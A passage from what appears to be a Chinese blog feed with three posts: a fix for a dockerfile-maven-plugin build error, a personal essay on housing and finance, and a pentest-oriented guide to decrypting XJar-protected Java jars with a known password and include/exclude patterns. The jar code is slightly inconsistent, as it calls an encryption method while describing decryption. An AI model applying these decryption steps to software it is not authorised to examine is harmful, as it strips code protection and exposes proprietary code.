class="hljs-name">plugin</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>错误如下：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">[ERROR] Failed to<span class="hljs-built_in"> execute </span>goal com.spotify:dockerfile-maven-plugin:1.4.12:build (default) on project engine: Execution default of goal com.spotify:dockerfile-maven-plugin:1.4.12:build failed: Could<span class="hljs-built_in"> not </span>acquire image ID<span class="hljs-built_in"> or </span>digest following build -&gt; [Help 1]<br></code></pre></td></tr></table></figure><p><img src="/img/20220212-01.png" alt="maven build error"></p><p>mvn调试输出内容：<br><img src="/img/20220212-02.png" alt="maven build debug error"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>解决方案仅限于我这种情况，dockerfile-maven-plugin配置如上所示。我进过多次尝试并翻了翻代码，发现dockerfile-maven-plugin  dockerfile参数如果没有指定默认是当前项目目录，我的Dockerfile文件位于engine&#x2F;src&#x2F;main&#x2F;docker目录下，由于pom.xml配置是参考了docker-maven-plugin，dockerfile参数内容发生了变化,docker-maven-plugin中dockerfile参数是Dockerfile所在的目录，dockerfile-maven-plugin中dockerfile参数是Dockerfile文件的相对路径，对于我这种情况，一种就是把Dockerfile移动到项目根目录下，或者将dockerfile更改成src&#x2F;main&#x2F;docker&#x2F;Dockerfile即可</p><p>执行以下命令进行构建：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">mvn clean <span class="hljs-keyword">package</span> <span class="hljs-title class_">dockerfile</span>:build -Dmaven.test.skip=<span class="hljs-literal">true</span> <br></code></pre></td></tr></table></figure><p><img src="/img/20220212-03.png" alt="maven build success">        </p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="repository-does-not-exist-or-may-require-‘docker-login’-denied-requested-access-to-the-resource-is-denied"><a href="#repository-does-not-exist-or-may-require-‘docker-login’-denied-requested-access-to-the-resource-is-denied" class="headerlink" title="repository does not exist or may require ‘docker login’: denied: requested access to the resource is denied"></a>repository does not exist or may require ‘docker login’: denied: requested access to the resource is denied</h3><p>之前使用的镜像文件一直是dockerhub上的，最近需要使用自行构建的镜像，重新编辑dockerfile，使用mvn命令编译项目，打包镜像过程中遇到了以下问题：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[ERROR]</span> pull access denied <span class="hljs-keyword">for</span> hksanduo/oracle-jdk-<span class="hljs-number">8</span>, repository does not exist or may require <span class="hljs-string">&#x27;docker login&#x27;</span>: denied: requested access to the resource is denied<br><span class="hljs-selector-attr">[WARNING]</span> An attempt failed, will retry <span class="hljs-number">1</span> more times<br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.plugin</span><span class="hljs-selector-class">.MojoExecutionException</span>: Could not build <span class="hljs-selector-tag">image</span><br>    at com<span class="hljs-selector-class">.spotify</span><span class="hljs-selector-class">.plugin</span><span class="hljs-selector-class">.dockerfile</span><span class="hljs-selector-class">.BuildMojo</span><span class="hljs-selector-class">.buildImage</span> (BuildMojo<span class="hljs-selector-class">.java</span>:<span class="hljs-number">247</span>)<br>    at com<span class="hljs-selector-class">.spotify</span><span class="hljs-selector-class">.plugin</span><span class="hljs-selector-class">.dockerfile</span><span class="hljs-selector-class">.BuildMojo</span><span class="hljs-selector-class">.execute</span> (BuildMojo<span class="hljs-selector-class">.java</span>:<span class="hljs-number">135</span>)<br>    at com<span class="hljs-selector-class">.spotify</span><span class="hljs-selector-class">.plugin</span><span class="hljs-selector-class">.dockerfile</span><span class="hljs-selector-class">.AbstractDockerMojo</span><span class="hljs-selector-class">.tryExecute</span> (AbstractDockerMojo<span class="hljs-selector-class">.java</span>:<span class="hljs-number">265</span>)<br>    at com<span class="hljs-selector-class">.spotify</span><span class="hljs-selector-class">.plugin</span><span class="hljs-selector-class">.dockerfile</span><span class="hljs-selector-class">.AbstractDockerMojo</span><span class="hljs-selector-class">.execute</span> (AbstractDockerMojo<span class="hljs-selector-class">.java</span>:<span class="hljs-number">254</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.plugin</span><span class="hljs-selector-class">.DefaultBuildPluginManager</span><span class="hljs-selector-class">.executeMojo</span> (DefaultBuildPluginManager<span class="hljs-selector-class">.java</span>:<span class="hljs-number">137</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.MojoExecutor</span><span class="hljs-selector-class">.execute</span> (MojoExecutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">210</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.MojoExecutor</span><span class="hljs-selector-class">.execute</span> (MojoExecutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">156</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.MojoExecutor</span><span class="hljs-selector-class">.execute</span> (MojoExecutor<span class="hljs-selector-class">.java</span>:<span class="hljs-number">148</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.LifecycleModuleBuilder</span><span class="hljs-selector-class">.buildProject</span> (LifecycleModuleBuilder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">117</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.LifecycleModuleBuilder</span><span class="hljs-selector-class">.buildProject</span> (LifecycleModuleBuilder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">81</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.builder</span><span class="hljs-selector-class">.singlethreaded</span><span class="hljs-selector-class">.SingleThreadedBuilder</span><span class="hljs-selector-class">.build</span> (SingleThreadedBuilder<span class="hljs-selector-class">.java</span>:<span class="hljs-number">56</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.lifecycle</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.LifecycleStarter</span><span class="hljs-selector-class">.execute</span> (LifecycleStarter<span class="hljs-selector-class">.java</span>:<span class="hljs-number">128</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.DefaultMaven</span><span class="hljs-selector-class">.doExecute</span> (DefaultMaven<span class="hljs-selector-class">.java</span>:<span class="hljs-number">305</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.DefaultMaven</span><span class="hljs-selector-class">.doExecute</span> (DefaultMaven<span class="hljs-selector-class">.java</span>:<span class="hljs-number">192</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.DefaultMaven</span><span class="hljs-selector-class">.execute</span> (DefaultMaven<span class="hljs-selector-class">.java</span>:<span class="hljs-number">105</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.cli</span><span class="hljs-selector-class">.MavenCli</span><span class="hljs-selector-class">.execute</span> (MavenCli<span class="hljs-selector-class">.java</span>:<span class="hljs-number">972</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.cli</span><span class="hljs-selector-class">.MavenCli</span><span class="hljs-selector-class">.doMain</span> (MavenCli<span class="hljs-selector-class">.java</span>:<span class="hljs-number">293</span>)<br>    at org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.maven</span><span class="hljs-selector-class">.cli</span><span class="hljs-selector-class">.MavenCli</span><span class="hljs-selector-class">.main</span> (MavenCli<span class="hljs-selector-class">.java</span>:<span class="hljs-number">196</span>)<br>    at jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke0</span> (Native Method)<br>    at jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.NativeMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span> (NativeMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">62</span>)<br>    at jdk<span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.DelegatingMethodAccessorImpl</span><span class="hljs-selector-class">.invoke</span> (DelegatingMethodAccessorImpl<span class="hljs-selector-class">.java</span>:<span class="hljs-number">43</span>)<br>    at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span> (Method<span class="hljs-selector-class">.java</span>:<span class="hljs-number">566</span>)<br>    at org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.plexus</span><span class="hljs-selector-class">.classworlds</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.Launcher</span><span class="hljs-selector-class">.launchEnhanced</span> (Launcher<span class="hljs-selector-class">.java</span>:<span class="hljs-number">282</span>)<br>    at org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.plexus</span><span class="hljs-selector-class">.classworlds</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.Launcher</span><span class="hljs-selector-class">.launch</span> (Launcher<span class="hljs-selector-class">.java</span>:<span class="hljs-number">225</span>)<br>    at org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.plexus</span><span class="hljs-selector-class">.classworlds</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.Launcher</span><span class="hljs-selector-class">.mainWithExitCode</span> (Launcher<span class="hljs-selector-class">.java</span>:<span class="hljs-number">406</span>)<br>    at org<span class="hljs-selector-class">.codehaus</span><span class="hljs-selector-class">.plexus</span><span class="hljs-selector-class">.classworlds</span><span class="hljs-selector-class">.launcher</span><span class="hljs-selector-class">.Launcher</span><span class="hljs-selector-class">.main</span> (Launcher<span class="hljs-selector-class">.java</span>:<span class="hljs-number">347</span>)<br>Caused by: com<span class="hljs-selector-class">.spotify</span><span class="hljs-selector-class">.docker</span><span class="hljs-selector-class">.client</span><span class="hljs-selector-class">.exceptions</span><span class="hljs-selector-class">.DockerException</span>: pull access denied <span class="hljs-keyword">for</span> hksanduo/oracle-jdk-<span class="hljs-number">8</span>, repository does not exist or may require <span class="hljs-string">&#x27;docker login&#x27;</span>: denied: requested access to the resource is denied<br></code></pre></td></tr></table></figure><p>通过错误，可以看出，从公共镜像中找不到hksanduo&#x2F;oracle-jdk-8,登录失败，也无法获取私有镜像，直接抛出异常，博主本人本地镜像源中是有hksanduo&#x2F;oracle-jdk-8这个镜像的，这个镜像是博主自行打包的，但是尚未提交的dockerhub，相当于在当前情况下，使用spotify dockerfile maven plugin无法使用本地的镜像源，每次只获取最新的镜像源进行构建。<br>通过翻阅资料和代码，找到一个配置属性，可以跳过，在pom.xml中增加配置信息，具体配置属性名称为：<code>pullNewerImage</code>，将值设置成 <strong>false</strong> 即可，配置参考：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.spotify<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>dockerfile-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">executions</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">execution</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>default<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">phase</span>&gt;</span>package<span class="hljs-tag">&lt;/<span class="hljs-name">phase</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">goals</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">goal</span>&gt;</span>build<span class="hljs-tag">&lt;/<span class="hljs-name">goal</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">goals</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">execution</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">executions</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">repository</span>&gt;</span>hksanduo/$</span><span class="hljs-template-variable">&#123;project.artifactId&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">repository</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">tag</span>&gt;</span>$</span><span class="hljs-template-variable">&#123;project.version&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">tag</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">dockerfile</span>&gt;</span>src/main/docker/Dockerfile<span class="hljs-tag">&lt;/<span class="hljs-name">dockerfile</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">buildArgs</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">JAR_FILE</span>&gt;</span>target/$</span><span class="hljs-template-variable">&#123;project.build.finalName&#125;</span><span class="language-xml">.jar<span class="hljs-tag">&lt;/<span class="hljs-name">JAR_FILE</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">SCA_CLIENT</span>&gt;</span>client/sca-client<span class="hljs-tag">&lt;/<span class="hljs-name">SCA_CLIENT</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">buildArgs</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">pullNewerImage</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">pullNewerImage</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/spotify/dockerfile-maven">https://github.com/spotify/dockerfile-maven</a>【dockerfile-maven】</li><li><a href="https://hjwjw.github.io/posts/9d44b524/">https://hjwjw.github.io/posts/9d44b524/</a></li><li><a href="https://spring.io/blog/2020/01/27/creating-docker-images-with-spring-boot-2-3-0-m1">https://spring.io/blog/2020/01/27/creating-docker-images-with-spring-boot-2-3-0-m1</a></li><li><a href="https://www.baeldung.com/spring-boot-docker-images">https://www.baeldung.com/spring-boot-docker-images</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于金融相关的一些感悟和观点</title>
    <link href="/2021/12/20/2021-12-20-insights-on-persional-life%20copy/"/>
    <url>/2021/12/20/2021-12-20-insights-on-persional-life%20copy/</url>
    
    <content type="html"><![CDATA[<p>关于金融相关的一些感悟和观点</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>首先这个题目相当大，个人非金融从业人员，观点大部分来源于大佬解读，平时也会阅读一些金融的资料，并没有什么有价值的产出，都是各路大神分析以后的结果，本人就不沽名钓誉了。本文仅是自己的一些观点和理解，更多是对生活的记录，不作为任何参考依据，各位看官图个乐呵就行。</p><p>快到而立之年，和女友在一起也多年了，是时候承担男人的责任了，各种结婚事项提上日程，包括买房，以前口袋也没多少大洋，但是日常吃喝还是能满足的，我们两个人也不是物质的人，能过的去就行，现在准备开始买房了，发现自己还是太年轻了，预计掏空两个家庭的积蓄，才能在二线城市买个老破小，种种心酸过来人都知道。个人比较幸运，准备买房时，国家出台二手房指导价，遏制二手房炒作，二手房业主大闹开发商，要求退房，紧接着X大爆雷，期房无法交付烂尾，影响全国，各地其他房企新房降价销售，业主售楼处维权，国家为了维稳，祭出了限跌令，召集房产商进京开会，勒令保交房……魔幻的事情一一浮现，一边是大部分年轻人购房困难，另一边是直播带货一姐偷税漏税，屡创新高，贫富差距逐渐拉大，先富带动后富只停留在口号上，个人作为一个普通民众，看到的只是资本套现离场，zf打击阶层炫富风气，减缓社会矛盾……一介布衣，苟活于世，无天人之资，只希望国家会越来越好，民众会越来越幸福。</p><h2 id="天涯神帖"><a href="#天涯神帖" class="headerlink" title="天涯神帖"></a>天涯神帖</h2><p>之前在天涯论坛上看到一篇神帖，帖子的名字叫《2017年10月开始货币政策会否真正转向》，该帖子已经被删除，我在其他地方找到了，链接放在参考链接里面。文章不长，大佬总结以下观点：</p><ul><li>1、开闸放水</li><li>2、让房价飙升</li><li>3、地方政府卖地解决财政收入</li><li>4、驱赶资金存款进入房地产蓄水池</li><li>5、保护外汇储备维持稳定</li><li>6、跟随美国收缩货币</li><li>7、银行成功转移风险确保安全（CDS）</li><li>8、刺破房价泡沫，实现房价下跌</li><li>9、让高位接盘投资客无法套现离场，锁定人民币资产，让肉烂在锅里</li><li>10、让土地财政转型税费多样化</li><li>11、开征房产税</li><li>12、驱赶剩余资金重新进入实体经济，保民生保就业</li><li>13、人民币国际化</li></ul><p>详细的分析可以读一下@沈正方 在github上对kkndme的详细解析。</p><h2 id="个人感悟"><a href="#个人感悟" class="headerlink" title="个人感悟"></a>个人感悟</h2><p>对于普通家庭出生的社畜，想要过的好是真的难，同样对比那些出卖苦力的底层人民，他们该过的有多艰难。对这个世界了解越多，对社会了解越多，对人性了解越深刻，个人内心就慢慢就麻木了，有些时候想的太明白也是一件痛苦的事，苟活于世，笑看繁花落尽，座观云淡风清。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://web.archive.org/web/20181108230618/bbs.tianya.cn/post-develop-2165689-1.shtml">https://web.archive.org/web/20181108230618/bbs.tianya.cn/post-develop-2165689-1.shtml</a>【2017年10月开始货币政策会否真正转向】</li><li><a href="https://github.com/shengcaishizhan/kkndme_tianya">https://github.com/shengcaishizhan/kkndme_tianya</a>【天涯神贴「2010年的房地产调控，我们收获了什么？写在房价暴涨前」脱水版，内容时间顺序和原贴一致，原贴中的优质非楼主写的内容，添加了引用格式便于区分。】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Diary</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Finance</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xjar加密破解后续</title>
    <link href="/2021/11/27/2021-11-27-Xjar-Crack-2/"/>
    <url>/2021/11/27/2021-11-27-Xjar-Crack-2/</url>
    
    <content type="html"><![CDATA[<p>Xjar加密破解后续</p><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>之前对部分系统做灰盒测试，研究过xjar的破解，但是上篇文章写的部分内容有些笼统，这里需要详细再描述一下，给部分同学做一下答疑。</p><h2 id="解密以后乱码"><a href="#解密以后乱码" class="headerlink" title="解密以后乱码"></a>解密以后乱码</h2><p>部分系统使用以下代码进行解密：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">Exception</span> &#123;<br>    <span class="hljs-title class_">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;temp&quot;</span>;<br>    <span class="hljs-title class_">XKey</span> <span class="hljs-variable">xKey</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">XKit</span>.<span class="hljs-property">key</span>(<span class="hljs-variable">password</span>);<br>    <span class="hljs-title class_">String</span> <span class="hljs-variable">jarpath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\\</span>work<span class="hljs-char escape_">\\</span>security<span class="hljs-char escape_">\\</span>xjarTest<span class="hljs-char escape_">\\</span>src<span class="hljs-char escape_">\\</span>main<span class="hljs-char escape_">\\</span>resources<span class="hljs-char escape_">\\</span>web.jar&quot;</span>;<br>    <span class="hljs-title class_">String</span> <span class="hljs-variable">decryptJarpath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\\</span>work<span class="hljs-char escape_">\\</span>security<span class="hljs-char escape_">\\</span>xjarTest<span class="hljs-char escape_">\\</span>src<span class="hljs-char escape_">\\</span>main<span class="hljs-char escape_">\\</span>resources<span class="hljs-char escape_">\\</span>web.jar&quot;</span>;<br>    <span class="hljs-title class_">XBoot</span>.<span class="hljs-property">decrypt</span>(<span class="hljs-variable">jarpath</span>, <span class="hljs-variable">decryptJarpath</span>, <span class="hljs-variable">xKey</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用以上这种解密方式，会将jar包中所有的字节码文件、静态资源文件都进行解密，如果在该jar加密的时候并未对这部分文件进行加密，那么在解密的过程中就会对这些未加密的文件进行解密处理，对正常编码的文件进行处理，你会得到一个无法识别的文件，比如：<br><img src="/img/20211127-01.png" alt="20211127-01.png"></p><p>解决这个问题的方法也很简单，在解密过程中指定排除的文件，或者指定解密的文件，使用使用Ant表达式，例如：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle">io<span class="hljs-regexp">/xjar/</span>**<br>com<span class="hljs-regexp">/company/</span><span class="hljs-keyword">project</span><span class="hljs-comment">/**</span><br><span class="hljs-comment">mapper/*Mapper.xml</span><br></code></pre></td></tr></table></figure><p>解密的代码也很简单，直接调用官方的解密接口进行解密就行：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-keyword">import</span> <span class="hljs-variable">io</span>.<span class="hljs-property">xjar</span>.<span class="hljs-property">XCryptos</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">io</span>.<span class="hljs-property">xjar</span>.<span class="hljs-property">XKit</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-variable">io</span>.<span class="hljs-property">xjar</span>.<span class="hljs-property">key</span>.<span class="hljs-property">XKey</span>;<br><br><span class="hljs-variable">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EcryptXjar</span> &#123;<br>    <span class="hljs-variable">public</span> <span class="hljs-keyword">static</span> <span class="hljs-variable">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-title class_">String</span>[] <span class="hljs-variable">args</span>) <span class="hljs-variable">throws</span> <span class="hljs-title class_">Exception</span> &#123;<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;temp&quot;</span>;<br>        <span class="hljs-title class_">XKey</span> <span class="hljs-variable">xKey</span> <span class="hljs-operator">=</span> <span class="hljs-title class_">XKit</span>.<span class="hljs-property">key</span>(<span class="hljs-variable">password</span>);<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">jarpath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\\</span>pentest<span class="hljs-char escape_">\\</span>xjarTest<span class="hljs-char escape_">\\</span>src<span class="hljs-char escape_">\\</span>main<span class="hljs-char escape_">\\</span>resources<span class="hljs-char escape_">\\</span>web.jar&quot;</span>;<br>        <span class="hljs-title class_">String</span> <span class="hljs-variable">decryptJarpath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;E:<span class="hljs-char escape_">\\</span>pentest<span class="hljs-char escape_">\\</span>xjarTest<span class="hljs-char escape_">\\</span>src<span class="hljs-char escape_">\\</span>main<span class="hljs-char escape_">\\</span>resources<span class="hljs-char escape_">\\</span>web.jar&quot;</span>;<br>        <span class="hljs-title class_">XCryptos</span>.<span class="hljs-property">encryption</span>()<br>                .<span class="hljs-property">from</span>(<span class="hljs-variable">jarpath</span>)<br>                .<span class="hljs-property">use</span>(<span class="hljs-variable">password</span>)<br>                .<span class="hljs-property">include</span>(<span class="hljs-string">&quot;/io/xjar/**/*.class&quot;</span>)<br>                .<span class="hljs-property">include</span>(<span class="hljs-string">&quot;/mapper/**/*Mapper.xml&quot;</span>)<br>                .<span class="hljs-property">exclude</span>(<span class="hljs-string">&quot;/static/**/*&quot;</span>)<br>                .<span class="hljs-property">exclude</span>(<span class="hljs-string">&quot;/conf/*&quot;</span>)<br>                .<span class="hljs-property">to</span>(<span class="hljs-variable">decryptJarpath</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><table><thead>    <tr>        <th>方法名称</th><th>参数列表</th><th>是否必选</th><th>方法说明</th>    </tr></thead><tbody>    <tr>        <td>from</td><td>(String jar)</td><td rowspan="2">二选一</td><td>指定待解密密JAR包路径</td>    </tr>    <tr>        <td>from</td><td>(File jar)</td><td>指定待解密JAR包文件</td>    </tr>    <tr>        <td>use</td><td>(String password)</td><td rowspan="2">二选一</td><td>指定解密密码</td>    </tr>    <tr>        <td>use</td><td>(String algorithm, int keysize, int ivsize, String password)</td><td>指定解密算法及解密密码</td>    </tr>    <tr>        <td>include</td><td>(String ant)</td><td>可多次调用</td><td>指定要解密的资源相对于classpath的ANT路径表达式</td>    </tr>    <tr>        <td>include</td><td>(Pattern regex)</td><td>可多次调用</td><td>指定要解密的资源相对于classpath的正则路径表达式</td>    </tr>    <tr>        <td>exclude</td><td>(String ant)</td><td>可多次调用</td><td>指定不解密的资源相对于classpath的ANT路径表达式</td>    </tr>    <tr>        <td>exclude</td><td>(Pattern regex)</td><td>可多次调用</td><td>指定不解密的资源相对于classpath的正则路径表达式</td>    </tr>    <tr>        <td>to</td><td>(String xJar)</td><td rowspan="2">二选一</td><td>指定解密后JAR包输出路径, 并执行解密.</td>    </tr>    <tr>        <td>to</td><td>(File xJar)</td><td>指定解密后JAR包输出文件, 并执行解密.</td>    </tr></tbody></table><ul><li>指定解密算法的时候密钥长度以及向量长度必须在算法可支持范围内, 具体解密算法的密钥及向量长度请自行百度或谷歌。</li><li>include 和 exclude 